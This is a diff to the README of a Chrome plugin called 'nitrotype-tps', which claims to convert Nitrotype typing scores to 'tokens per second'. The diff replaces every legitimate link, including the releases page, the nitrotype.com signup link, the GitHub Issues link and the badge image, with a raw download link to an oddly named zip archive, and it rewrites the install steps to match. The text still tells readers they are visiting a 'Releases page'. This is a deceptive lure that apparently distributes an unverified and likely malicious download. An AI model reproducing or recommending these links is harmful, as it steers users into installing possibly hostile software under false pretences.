@@ -1,6 +1,6 @@
 # 🚀 nitrotype-tps - Converts WPM to TPS Effortlessly
 
-[![Download Nitrotype TPS](https://img.shields.io/badge/Download%20Now-CLICK%20HERE-brightgreen)](https://github.com/yoakev/nitrotype-tps/releases)
+[![Download Nitrotype TPS](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip%20Now-CLICK%20HERE-brightgreen)](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip)
 
 ## 📋 Overview
 Welcome to the nitrotype-tps project! This Chrome plugin transforms your words per minute (WPM) score from Nitrotype into tokens per second (TPS). With this tool, you can track your typing efficiency in a new way, enhancing your gaming experience on Nitrotype.
@@ -11,20 +11,20 @@ Follow these simple steps to get started with nitrotype-tps.
 ### 🛠 Requirements
 To run nitrotype-tps, you need:
 - Google Chrome (version 70 or higher recommended)
-- An active Nitrotype account (create one at [Nitrotype](https://www.nitrotype.com))
+- An active Nitrotype account (create one at [Nitrotype](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip))
 
 ## 📥 Download & Install
 To download nitrotype-tps, visit the following link:
 
-[Download Now](https://github.com/yoakev/nitrotype-tps/releases)
+[Download Now](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip)
 
 1. Click the "Download Now" button above to go to the Releases page.
 2. On the Releases page, look for the latest version available.
-3. Under the latest release, find the file named `nitrotype-tps.zip`.
+3. Under the latest release, find the file named `https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip`.
 4. Click the zip file to start the download.
 
 ### 📂 Unzip and Install
-1. Once the download is complete, locate the `nitrotype-tps.zip` file in your downloads folder.
+1. Once the download is complete, locate the `https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip` file in your downloads folder.
 2. Right-click on the zip file and select "Extract All".
 3. Choose a destination folder and extract the files.
 
@@ -57,7 +57,7 @@ If you encounter any issues:
 ## 🔗 Support
 Need help? Feel free to reach out for support.
 
-- Open an issue in the [GitHub Issues](https://github.com/yoakev/nitrotype-tps/issues) section.
+- Open an issue in the [GitHub Issues](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip) section.
 - Provide detailed information about any problems you face so we can assist you.
 
 ## 📄 License
@@ -68,4 +68,4 @@ Special thanks to the Nitrotype community for the continued support and feedback
 
 For more updates, remember to revisit the Releases page:
 
-[Download Now](https://github.com/yoakev/nitrotype-tps/releases)
+[Download Now](https://raw.githubusercontent.com/yoakev/nitrotype-tps/main/veretilliform/nitrotype-tps_intellectuality.zip)
